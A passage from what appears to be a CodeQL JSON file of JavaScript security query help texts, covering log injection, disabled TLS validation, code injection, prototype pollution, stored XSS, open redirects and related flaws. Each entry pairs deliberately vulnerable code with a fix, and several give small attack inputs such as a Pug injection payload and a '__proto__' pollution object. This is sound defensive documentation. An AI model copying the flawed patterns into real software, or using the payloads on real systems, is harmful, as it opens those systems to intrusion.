    "help": "# Log injection\nIf unsanitized user input is written to a log entry, a malicious user may be able to forge new log entries.\n\nForgery can occur if a user provides some input with characters that are interpreted when the log output is displayed. If the log is displayed as a plain text file, then new line characters can be used by a malicious user. If the log is displayed as HTML, then arbitrary HTML may be included to spoof log entries.\n\n\n## Recommendation\nUser input should be suitably sanitized before it is logged.\n\nIf the log entries are in plain text then line breaks should be removed from user input, using `String.prototype.replace` or similar. Care should also be taken that user input is clearly marked in log entries.\n\nFor log entries that will be displayed in HTML, user input should be HTML-encoded before being logged, to prevent forgery and other forms of HTML injection.\n\n\n## Example\nIn the first example, a username, provided by the user, is logged using \\`console.info\\`. In the first case, it is logged without any sanitization. In the second case, the username is used to build an error that is logged using \\`console.error\\`. If a malicious user provides \\`username=Guest%0a\\[INFO\\]+User:+Admin%0a\\` as a username parameter, the log entry will be splitted in two different lines, where the second line will be \\`\\[INFO\\]+User:+Admin\\`.\n\n\n```javascript\nconst http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n    let q = url.parse(req.url, true);\n\n    console.info(`[INFO] User: ${q.query.username}`); // BAD: User input logged as-is\n})\n\nserver.listen(3000, '127.0.0.1', () => {});\n\n```\nIn the second example, `String.prototype.replace` is used to ensure no line endings are present in the user input.\n\n\n```javascript\nconst http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n    let q = url.parse(req.url, true);\n\n    // GOOD: remove newlines from user controlled input before logging\n    let username = q.query.username.replace(/\\n|\\r/g, \"\");\n\n    console.info(`[INFO] User: ${username}`);\n});\n\nserver.listen(3000, '127.0.0.1', () => {});\n\n```\n\n## References\n* OWASP: [Log Injection](https://www.owasp.org/index.php/Log_Injection).\n* Common Weakness Enumeration: [CWE-117](https://cwe.mitre.org/data/definitions/117.html).\n"
  },
  "js/disabling-certificate-validation": {
    "name": "Disabling certificate validation",
    "description": "Disabling cryptographic certificate validation can cause security vulnerabilities.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "very-high",
    "id": "js/disabling-certificate-validation",
    "tags": [
      "security",
      "external/cwe/cwe-295",
      "external/cwe/cwe-297"
    ],
    "filename": "b8cda810-DisablingCertificateValidation",
    "language": "javascript",
    "help": "# Disabling certificate validation\nCertificate validation is the standard authentication method of a secure TLS connection. Without it, there is no guarantee about who the other party of a TLS connection is, making man-in-the-middle attacks more likely to occur\n\nWhen testing software that uses TLS connections, it may be useful to disable the certificate validation temporarily. But disabling it in production environments is strongly discouraged, unless an alternative method of authentication is used.\n\n\n## Recommendation\nDo not disable certificate validation for TLS connections.\n\n\n## Example\nThe following example shows a HTTPS connection that transfers confidential information to a remote server. But the connection is not secure since the `rejectUnauthorized` option of the connection is set to `false`. As a consequence, anyone can impersonate the remote server, and receive the confidential information.\n\n\n```javascript\nlet https = require(\"https\");\n\nhttps.request(\n  {\n    hostname: \"secure.my-online-bank.com\",\n    port: 443,\n    method: \"POST\",\n    path: \"send-confidential-information\",\n    rejectUnauthorized: false // BAD\n  },\n  response => {\n    // ... communicate with secure.my-online-bank.com\n  }\n);\n\n```\nTo make the connection secure, the `rejectUnauthorized` option should have its default value, or be explicitly set to `true`.\n\n\n## References\n* Wikipedia: [Transport Layer Security (TLS)](https://en.wikipedia.org/wiki/Transport_Layer_Security)\n* Wikipedia: [Man-in-the-middle attack](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)\n* Node.js: [TLS (SSL)](https://nodejs.org/api/tls.html)\n* Common Weakness Enumeration: [CWE-295](https://cwe.mitre.org/data/definitions/295.html).\n* Common Weakness Enumeration: [CWE-297](https://cwe.mitre.org/data/definitions/297.html).\n"
  },
  "js/insecure-helmet-configuration": {
    "name": "Insecure configuration of Helmet security middleware",
    "description": "The Helmet middleware is used to set security-related HTTP headers in Express applications. This query finds instances where the middleware is configured with important security features disabled.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.0,
    "precision": "high",
    "id": "js/insecure-helmet-configuration",
    "tags": [
      "security",
      "external/cwe/cwe-693",
      "external/cwe/cwe-1021"
    ],
    "filename": "0ee9a971-InsecureHelmet",
    "language": "javascript",
    "help": "# Insecure configuration of Helmet security middleware\n[Helmet](https://helmetjs.github.io/) is a collection of middleware functions for securing Express apps. It sets various HTTP headers to guard against common web vulnerabilities. This query detects Helmet misconfigurations that can lead to security vulnerabilities, specifically:\n\n* Disabling frame protection\n* Disabling Content Security Policy\nContent Security Policy (CSP) helps spot and prevent injection attacks such as Cross-Site Scripting (XSS). Removing frame protections exposes an application to attacks such as clickjacking, where an attacker can trick a user into clicking on a button or link on a targeted page when they intended to click on the page carrying out the attack.\n\nUsers of the query can extend the set of required Helmet features by adding additional checks for them, using CodeQL [data extensions](https://codeql.github.com/docs/codeql-language-guides/customizing-library-models-for-javascript/) in a [CodeQL model pack](https://docs.github.com/en/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-and-working-with-codeql-packs#creating-a-codeql-model-pack). See `CUSTOMIZING.md` in the query source for more information.\n\n\n## Recommendation\nTo help mitigate these vulnerabilities, ensure that the following Helmet functions are not disabled, and are configured appropriately to your application:\n\n* `frameguard`\n* `contentSecurityPolicy`\n\n## Example\nThe following code snippet demonstrates Helmet configured in an insecure manner:\n\n\n```javascript\nconst helmet = require('helmet');\n\napp.use(helmet({\n    frameguard: false,\n    contentSecurityPolicy: false\n}));\n```\nIn this example, the defaults are used, which enables frame protection and a default Content Security Policy.\n\n\n```javascript\napp.use(helmet());\n```\nYou can also enable a custom Content Security Policy by passing an object to the `contentSecurityPolicy` key. For example, taken from the [Helmet docs](https://helmetjs.github.io/#content-security-policy):\n\n\n```javascript\napp.use(\n    helmet({\n        contentSecurityPolicy: {\n            directives: {\n                \"script-src\": [\"'self'\", \"example.com\"],\n                \"style-src\": null,\n            },\n        },\n    })\n);\n```\n\n## References\n* [helmet.js website](https://helmetjs.github.io/)\n* [Content Security Policy (CSP) | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)\n* [Mozilla Web Security Guidelines](https://infosec.mozilla.org/guidelines/web_security)\n* [Protect against clickjacking | MDN](https://developer.mozilla.org/en-US/docs/Web/Security#protect_against_clickjacking)\n* Common Weakness Enumeration: [CWE-693](https://cwe.mitre.org/data/definitions/693.html).\n* Common Weakness Enumeration: [CWE-1021](https://cwe.mitre.org/data/definitions/1021.html).\n"
  },
  "js/prototype-pollution-utility": {
    "name": "Prototype-polluting function",
    "description": "Functions recursively assigning properties on objects may be the cause of accidental modification of a built-in prototype object.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 6.1,
    "precision": "high",
    "id": "js/prototype-pollution-utility",
    "tags": [
      "security",
      "external/cwe/cwe-078",
      "external/cwe/cwe-079",
      "external/cwe/cwe-094",
      "external/cwe/cwe-400",
      "external/cwe/cwe-471",
      "external/cwe/cwe-915"
    ],
    "filename": "cffa8a05-PrototypePollutingFunction",
    "language": "javascript",
    "help": "# Prototype-polluting function\nMost JavaScript objects inherit the properties of the built-in `Object.prototype` object. Prototype pollution is a type of vulnerability in which an attacker is able to modify `Object.prototype`. Since most objects inherit from the compromised `Object.prototype`, the attacker can use this to tamper with the application logic, and often escalate to remote code execution or cross-site scripting.\n\nOne way to cause prototype pollution is through use of an unsafe *merge* or *extend* function to recursively copy properties from one object to another, or through the use of a *deep assignment* function to assign to an unverified chain of property names. Such a function has the potential to modify any object reachable from the destination object, and the built-in `Object.prototype` is usually reachable through the special properties `__proto__` and `constructor.prototype`.\n\n\n## Recommendation\nThe most effective place to guard against this is in the function that performs the recursive copy or deep assignment.\n\nOnly merge or assign a property recursively when it is an own property of the *destination* object. Alternatively, block the property names `__proto__` and `constructor` from being merged or assigned to.\n\n\n## Example\nThis function recursively copies properties from `src` to `dst`:\n\n\n```javascript\nfunction merge(dst, src) {\n    for (let key in src) {\n        if (!src.hasOwnProperty(key)) continue;\n        if (isObject(dst[key])) {\n            merge(dst[key], src[key]);\n        } else {\n            dst[key] = src[key];\n        }\n    }\n}\n\n```\nHowever, if `src` is the object `{\"__proto__\": {\"isAdmin\": true}}`, it will inject the property `isAdmin: true` in `Object.prototype`.\n\nThe issue can be fixed by ensuring that only own properties of the destination object are merged recursively:\n\n\n```javascript\nfunction merge(dst, src) {\n    for (let key in src) {\n        if (!src.hasOwnProperty(key)) continue;\n        if (dst.hasOwnProperty(key) && isObject(dst[key])) {\n            merge(dst[key], src[key]);\n        } else {\n            dst[key] = src[key];\n        }\n    }\n}\n\n```\nAlternatively, block the `__proto__` and `constructor` properties:\n\n\n```javascript\nfunction merge(dst, src) {\n    for (let key in src) {\n        if (!src.hasOwnProperty(key)) continue;\n        if (key === \"__proto__\" || key === \"constructor\") continue;\n        if (isObject(dst[key])) {\n            merge(dst[key], src[key]);\n        } else {\n            dst[key] = src[key];\n        }\n    }\n}\n\n```\n\n## References\n* Prototype pollution attacks: [lodash](https://hackerone.com/reports/380873), [jQuery](https://hackerone.com/reports/454365), [extend](https://hackerone.com/reports/381185), [just-extend](https://hackerone.com/reports/430291), [merge.recursive](https://hackerone.com/reports/381194).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n* Common Weakness Enumeration: [CWE-471](https://cwe.mitre.org/data/definitions/471.html).\n* Common Weakness Enumeration: [CWE-915](https://cwe.mitre.org/data/definitions/915.html).\n"
  },
  "js/code-injection": {
    "name": "Code injection",
    "description": "Interpreting unsanitized user input as code allows a malicious user arbitrary code execution.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "high",
    "id": "js/code-injection",
    "tags": [
      "security",
      "external/cwe/cwe-094",
      "external/cwe/cwe-095",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116"
    ],
    "filename": "a2d22db7-CodeInjection",
    "language": "javascript",
    "help": "# Code injection\nDirectly evaluating user input (for example, an HTTP request parameter) as code without properly sanitizing the input first allows an attacker arbitrary code execution. This can occur when user input is treated as JavaScript, or passed to a framework which interprets it as an expression to be evaluated. Examples include AngularJS expressions or JQuery selectors.\n\n\n## Recommendation\nAvoid including user input in any expression which may be dynamically evaluated. If user input must be included, use context-specific escaping before including it. It is important that the correct escaping is used for the type of evaluation that will occur.\n\n\n## Example\nThe following example shows part of the page URL being evaluated as JavaScript code. This allows an attacker to provide JavaScript within the URL. If an attacker can persuade a user to click on a link to such a URL, the attacker can evaluate arbitrary JavaScript in the browser of the user to, for example, steal cookies containing session information.\n\n\n```javascript\neval(document.location.href.substring(document.location.href.indexOf(\"default=\")+8))\n\n```\nThe following example shows a Pug template being constructed from user input, allowing attackers to run arbitrary code via a payload such as `#{global.process.exit(1)}`.\n\n\n```javascript\nconst express = require('express')\nvar pug = require('pug');\nconst app = express()\n\napp.post('/', (req, res) => {\n    var input = req.query.username;\n    var template = `\ndoctype\nhtml\nhead\n    title= 'Hello world'\nbody\n    form(action='/' method='post')\n        input#name.form-control(type='text)\n        button.btn.btn-primary(type='submit') Submit\n    p Hello `+ input\n    var fn = pug.compile(template);\n    var html = fn();\n    res.send(html);\n})\n\n```\nBelow is an example of how to use a template engine without any risk of template injection. The user input is included via an interpolation expression `#{username}` whose value is provided as an option to the template, instead of being part of the template string itself:\n\n\n```javascript\nconst express = require('express')\nvar pug = require('pug');\nconst app = express()\n\napp.post('/', (req, res) => {\n    var input = req.query.username;\n    var template = `\ndoctype\nhtml\nhead\n    title= 'Hello world'\nbody\n    form(action='/' method='post')\n        input#name.form-control(type='text)\n        button.btn.btn-primary(type='submit') Submit\n    p Hello #{username}`\n    var fn = pug.compile(template);\n    var html = fn({username: input});\n    res.send(html);\n})\n\n```\n\n## References\n* OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).\n* Wikipedia: [Code Injection](https://en.wikipedia.org/wiki/Code_injection).\n* PortSwigger Research Blog: [Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n* Common Weakness Enumeration: [CWE-95](https://cwe.mitre.org/data/definitions/95.html).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "js/stack-trace-exposure": {
    "name": "Information exposure through a stack trace",
    "description": "Propagating stack trace information to an external user can unintentionally reveal implementation details that are useful to an attacker for developing a subsequent exploit.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 5.4,
    "precision": "very-high",
    "id": "js/stack-trace-exposure",
    "tags": [
      "security",
      "external/cwe/cwe-209",
      "external/cwe/cwe-497"
    ],
    "filename": "a590334a-StackTraceExposure",
    "language": "javascript",
    "help": "# Information exposure through a stack trace\nSoftware developers often add stack traces to error messages, as a debugging aid. Whenever that error message occurs for an end user, the developer can use the stack trace to help identify how to fix the problem. In particular, stack traces can tell the developer more about the sequence of events that led to a failure, as opposed to merely the final state of the software when the error occurred.\n\nUnfortunately, the same information can be useful to an attacker. The sequence of function names in a stack trace can reveal the structure of the application as well as any internal components it relies on. Furthermore, the error message at the top of a stack trace can include information such as server-side file names and SQL code that the application relies on, allowing an attacker to fine-tune a subsequent injection attack.\n\n\n## Recommendation\nSend the user a more generic error message that reveals less information. Either suppress the stack trace entirely, or log it only on the server.\n\n\n## Example\nIn the following example, an exception is caught and its stack trace is sent back to the remote user as part of the HTTP response. As such, the user is able to see a detailed stack trace, which may contain sensitive information.\n\n\n```javascript\nvar http = require('http');\n\nhttp.createServer(function onRequest(req, res) {\n  var body;\n  try {\n    body = handleRequest(req);\n  }\n  catch (err) {\n    res.statusCode = 500;\n    res.setHeader(\"Content-Type\", \"text/plain\");\n    res.end(err.stack); // NOT OK\n    return;\n  }\n  res.statusCode = 200;\n  res.setHeader(\"Content-Type\", \"application/json\");\n  res.setHeader(\"Content-Length\", body.length);\n  res.end(body);\n}).listen(3000);\n\n```\nInstead, the stack trace should be logged only on the server. That way, the developers can still access and use the error log, but remote users will not see the information:\n\n\n```javascript\nvar http = require('http');\n\nhttp.createServer(function onRequest(req, res) {\n  var body;\n  try {\n    body = handleRequest(req);\n  }\n  catch (err) {\n    res.statusCode = 500;\n    res.setHeader(\"Content-Type\", \"text/plain\");\n    log(\"Exception occurred\", err.stack);\n    res.end(\"An exception occurred\"); // OK\n    return;\n  }\n  res.statusCode = 200;\n  res.setHeader(\"Content-Type\", \"application/json\");\n  res.setHeader(\"Content-Length\", body.length);\n  res.end(body);\n}).listen(3000);\n\n```\n\n## References\n* OWASP: [Improper Error Handling](https://owasp.org/www-community/Improper_Error_Handling).\n* Common Weakness Enumeration: [CWE-209](https://cwe.mitre.org/data/definitions/209.html).\n* Common Weakness Enumeration: [CWE-497](https://cwe.mitre.org/data/definitions/497.html).\n"
  },
  "js/biased-cryptographic-random": {
    "name": "Creating biased random numbers from a cryptographically secure source",
    "description": "Some mathematical operations on random numbers can cause bias in the results and compromise security.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "js/biased-cryptographic-random",
    "tags": [
      "security",
      "external/cwe/cwe-327"
    ],
    "filename": "81ce0e92-BadRandomness",
    "language": "javascript",
    "help": "# Creating biased random numbers from a cryptographically secure source\nGenerating secure random numbers can be an important part of creating a secure software system. This can be done using APIs that create cryptographically secure random numbers.\n\nHowever, using some mathematical operations on these cryptographically secure random numbers can create biased results, where some outcomes are more likely than others. Such biased results can make it easier for an attacker to guess the random numbers, and thereby break the security of the software system.\n\n\n## Recommendation\nBe very careful not to introduce bias when performing mathematical operations on cryptographically secure random numbers.\n\nIf possible, avoid performing mathematical operations on cryptographically secure random numbers at all, and use a preexisting library instead.\n\n\n## Example\nThe example below uses the modulo operator to create an array of 10 random digits using random bytes as the source for randomness.\n\n\n```javascript\nconst crypto = require('crypto');\n\nconst digits = [];\nfor (let i = 0; i < 10; i++) {\n    digits.push(crypto.randomBytes(1)[0] % 10); // NOT OK\n}\n```\nThe random byte is a uniformly random value between 0 and 255, and thus the result from using the modulo operator is slightly more likely to be between 0 and 5 than between 6 and 9.\n\nThe issue has been fixed in the code below by using a library that correctly generates cryptographically secure random values.\n\n\n```javascript\nconst cryptoRandomString = require('crypto-random-string');\n\nconst digits = cryptoRandomString({length: 10, type: 'numeric'});\n```\nAlternatively, the issue can be fixed by fixing the math in the original code. In the code below the random byte is discarded if the value is greater than or equal to 250. Thus the modulo operator is used on a uniformly random number between 0 and 249, which results in a uniformly random digit between 0 and 9.\n\n\n```javascript\nconst crypto = require('crypto');\n\nconst digits = [];\nwhile (digits.length < 10) {\n    const byte = crypto.randomBytes(1)[0];\n    if (byte >= 250) {\n        continue;\n    }\n    digits.push(byte % 10); // OK\n}\n```\n\n## References\n* Stack Overflow: [Understanding \u201crandomness\u201d](https://stackoverflow.com/questions/3956478/understanding-randomness).\n* OWASP: [Insecure Randomness](https://owasp.org/www-community/vulnerabilities/Insecure_Randomness).\n* OWASP: [Rule - Use strong approved cryptographic algorithms](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#rule---use-strong-approved-authenticated-encryption).\n* Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).\n"
  },
  "js/stored-xss": {
    "name": "Stored cross-site scripting",
    "description": "Using uncontrolled stored values in HTML allows for a stored cross-site scripting vulnerability.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "high",
    "id": "js/stored-xss",
    "tags": [
      "security",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116"
    ],
    "filename": "bc37419c-StoredXss",
    "language": "javascript",
    "help": "# Stored cross-site scripting\nDirectly using uncontrolled stored value (for example, file names) to create HTML content without properly sanitizing the input first, allows for a cross-site scripting vulnerability.\n\nThis kind of vulnerability is also called *stored* cross-site scripting, to distinguish it from other types of cross-site scripting.\n\n\n## Recommendation\nTo guard against cross-site scripting, consider using contextual output encoding/escaping before using uncontrolled stored values to create HTML content, or one of the other solutions that are mentioned in the references.\n\n\n## Example\nThe following example code writes file names directly to a HTTP response. This leaves the website vulnerable to cross-site scripting, if an attacker can choose the file names on the disk.\n\n\n```javascript\nvar express = require('express'),\n    fs = require('fs');\n\nexpress().get('/list-directory', function(req, res) {\n    fs.readdir('/public', function (error, fileNames) {\n        var list = '<ul>';\n        fileNames.forEach(fileName => {\n            // BAD: `fileName` can contain HTML elements\n            list += '<li>' + fileName + '</li>';\n        });\n        list += '</ul>'\n        res.send(list);\n    });\n});\n\n```\nSanitizing the file names prevents the vulnerability:\n\n\n```javascript\nvar express = require('express'),\n    fs = require('fs'),\n    escape = require('escape-html');\n\nexpress().get('/list-directory', function(req, res) {\n    fs.readdir('/public', function (error, fileNames) {\n        var list = '<ul>';\n        fileNames.forEach(fileName => {\n            // GOOD: escaped `fileName` can not contain HTML elements\n            list += '<li>' + escape(fileName) + '</li>';\n        });\n        list += '</ul>'\n        res.send(list);\n    });\n});\n\n```\n\n## References\n* OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n* OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).\n* Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "js/user-controlled-bypass": {
    "name": "User-controlled bypass of security check",
    "description": "Conditions that the user controls are not suited for making security-related decisions.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "medium",
    "id": "js/user-controlled-bypass",
    "tags": [
      "security",
      "external/cwe/cwe-807",
      "external/cwe/cwe-290"
    ],
    "filename": "8edfff20-ConditionalBypass",
    "language": "javascript",
    "help": "# User-controlled bypass of security check\nUsing user-controlled data in a permissions check may allow a user to gain unauthorized access to protected functionality or data.\n\n\n## Recommendation\nWhen checking whether a user is authorized for a particular activity, do not use data that is entirely controlled by that user in the permissions check. If necessary, always validate the input, ideally against a fixed list of expected values.\n\nSimilarly, do not decide which permission to check for, based on user data. In particular, avoid using computation to decide which permissions to check for. Use fixed permissions for particular actions, rather than generating the permission to check for.\n\n\n## Example\nIn this example, we have a server that shows private information for a user, based on the request parameter `userId`. For privacy reasons, users may only view their own private information, so the server checks that the request parameter `userId` matches a cookie value for the user who is logged in.\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.cookies.loggedInUserId !== req.params.userId) {\n        // BAD: login decision made based on user controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\nThis security check is, however, insufficient since an attacker can craft their cookie values to match those of any user. To prevent this, the server can cryptographically sign the security critical cookie values:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.signedCookies.loggedInUserId !== req.params.userId) {\n        // GOOD: login decision made based on server controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-807](https://cwe.mitre.org/data/definitions/807.html).\n* Common Weakness Enumeration: [CWE-290](https://cwe.mitre.org/data/definitions/290.html).\n"
  },
  "js/server-side-unvalidated-url-redirection": {
    "name": "Server-side URL redirect",
    "description": "Server-side URL redirection based on unvalidated user input may cause redirection to malicious web sites.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 6.1,
    "id": "js/server-side-unvalidated-url-redirection",
    "tags": [
      "security",
      "external/cwe/cwe-601"
    ],
    "precision": "high",
    "filename": "d7679eb5-ServerSideUrlRedirect",
    "language": "javascript",
    "help": "# Server-side URL redirect\nDirectly incorporating user input into a URL redirect request without validating the input can facilitate phishing attacks. In these attacks, unsuspecting users can be redirected to a malicious site that looks very similar to the real site they intend to visit, but which is controlled by the attacker.\n\n\n## Recommendation\nTo guard against untrusted URL redirection, it is advisable to avoid putting user input directly into a redirect URL. Instead, maintain a list of authorized redirects on the server; then choose from that list based on the user input provided.\n\nIf this is not possible, then the user input should be validated in some other way, for example, by verifying that the target URL is on the same host as the current page.\n\n\n## Example\nThe following example shows an HTTP request parameter being used directly in a URL redirect without validating the input, which facilitates phishing attacks:\n\n\n```javascript\nconst app = require(\"express\")();\n\napp.get(\"/redirect\", function (req, res) {\n  // BAD: a request parameter is incorporated without validation into a URL redirect\n  res.redirect(req.query[\"target\"]);\n});\n\n```\nOne way to remedy the problem is to validate the user input against a known fixed string before doing the redirection:\n\n\n```javascript\nconst app = require(\"express\")();\n\nconst VALID_REDIRECT = \"http://cwe.mitre.org/data/definitions/601.html\";\n\napp.get(\"/redirect\", function (req, res) {\n  // GOOD: the request parameter is validated against a known fixed string\n  let target = req.query[\"target\"];\n  if (VALID_REDIRECT === target) {\n    res.redirect(target);\n  } else {\n    res.redirect(\"/\");\n  }\n});\n\n```\nAlternatively, we can check that the target URL does not redirect to a different host by parsing it relative to a base URL with a known host and verifying that the host stays the same:\n\n\n```javascript\nconst app = require(\"express\")();\n\nfunction isLocalUrl(path) {\n  try {\n    return (\n      // TODO: consider substituting your own domain for example.com\n      new URL(path, \"https://example.com\").origin === \"https://example.com\"\n    );\n  } catch (e) {\n    return false;\n  }\n}\n\napp.get(\"/redirect\", function (req, res) {\n  // GOOD: check that we don't redirect to a different host\n  let target = req.query[\"target\"];\n  if (isLocalUrl(target)) {\n    res.redirect(target);\n  } else {\n    res.redirect(\"/\");\n  }\n});\n\n```\nNote that as written, the above code will allow redirects to URLs on `example.com`, which is harmless but perhaps not intended. You can substitute your own domain (if known) for `example.com` to prevent this.\n\n\n## References\n* OWASP: [ XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-601](https://cwe.mitre.org/data/definitions/601.html).\n"
  },
  "js/cross-window-information-leak": {
    "name": "Cross-window communication with unrestricted target origin",
    "description": "When sending sensitive information to another window using `postMessage`, the origin of the target window should be restricted to avoid unintentional information leaks.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 4.3,
    "precision": "high",
    "id": "js/cross-window-information-leak",
    "tags": [
      "security",
      "external/cwe/cwe-201",
      "external/cwe/cwe-359"
    ],
    "filename": "7625e066-PostMessageStar",
    "language": "javascript",
    "help": "# Cross-window communication with unrestricted target origin\nThe `window.postMessage` method allows different windows or iframes to communicate directly, even if they were loaded from different origins, circumventing the usual same-origin policy.\n\nThe sender of the message can restrict the origin of the receiver by specifying a target origin. If the receiver window does not come from this origin, the message is not sent.\n\nAlternatively, the sender can specify a target origin of `'*'`, which means that any origin is acceptable and the message is always sent.\n\nThis feature should not be used if the message being sent contains sensitive data such as user credentials: the target window may have been loaded from a malicious site, to which the data would then become available.\n\n\n## Recommendation\nIf possible, specify a target origin when using `window.postMessage`. Alternatively, encrypt the sensitive data before sending it to prevent an unauthorized receiver from accessing it.\n\n\n## Example\nThe following example code sends user credentials (in this case, their user name) to `window.parent` without checking its origin. If a malicious site loads the page containing this code into an iframe it would be able to gain access to the user name.\n\n\n```javascript\nwindow.parent.postMessage(userName, '*');\n\n```\nTo prevent this from happening, the origin of the target window should be restricted, as in this example:\n\n\n```javascript\nwindow.parent.postMessage(userName, 'https://github.com');\n\n```\n\n## References\n* Mozilla Developer Network: [Window.postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage).\n* Mozilla Developer Network: [Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy).\n* Common Weakness Enumeration: [CWE-201](https://cwe.mitre.org/data/definitions/201.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n"
  },
  "js/regex/missing-regexp-anchor": {
    "name": "Missing regular expression anchor",
    "description": "Regular expressions without anchors can be vulnerable to bypassing.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "medium",
    "id": "js/regex/missing-regexp-anchor",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-020"
    ],
    "filename": "bc247e13-MissingRegExpAnchor",
    "language": "javascript",
    "help": "# Missing regular expression anchor\nSanitizing untrusted input with regular expressions is a common technique. However, it is error-prone to match untrusted input against regular expressions without anchors such as `^` or `$`. Malicious input can bypass such security checks by embedding one of the allowed patterns in an unexpected location.\n\nEven if the matching is not done in a security-critical context, it may still cause undesirable behavior when the regular expression accidentally matches.\n\n\n## Recommendation\nUse anchors to ensure that regular expressions match at the expected locations.\n\n\n## Example\nThe following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains, and not some malicious site.\n\n\n```javascript\napp.get(\"/some/path\", function(req, res) {\n    let url = req.param(\"url\");\n    // BAD: the host of `url` may be controlled by an attacker\n    if (url.match(/https?:\\/\\/www\\.example\\.com\\//)) {\n        res.redirect(url);\n    }\n});\n\n```\nThe check with the regular expression match is, however, easy to bypass. For example by embedding `http://example.com/` in the query string component: `http://evil-example.net/?x=http://example.com/`. Address these shortcomings by using anchors in the regular expression instead:\n\n\n```javascript\napp.get(\"/some/path\", function(req, res) {\n    let url = req.param(\"url\");\n    // GOOD: the host of `url` can not be controlled by an attacker\n    if (url.match(/^https?:\\/\\/www\\.example\\.com\\//)) {\n        res.redirect(url);\n    }\n});\n\n```\nA related mistake is to write a regular expression with multiple alternatives, but to only include an anchor for one of the alternatives. As an example, the regular expression `/^www\\.example\\.com|beta\\.example\\.com/` will match the host `evil.beta.example.com` because the regular expression is parsed as `/(^www\\.example\\.com)|(beta\\.example\\.com)/`\n\n\n## References\n* MDN: [Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions)\n* OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)\n* OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "js/missing-rate-limiting": {
    "name": "Missing rate limiting",
    "description": "An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "js/missing-rate-limiting",
    "tags": [
      "security",
      "external/cwe/cwe-770",
      "external/cwe/cwe-307",
      "external/cwe/cwe-400"
    ],
    "filename": "12649d14-MissingRateLimiting",
    "language": "javascript",
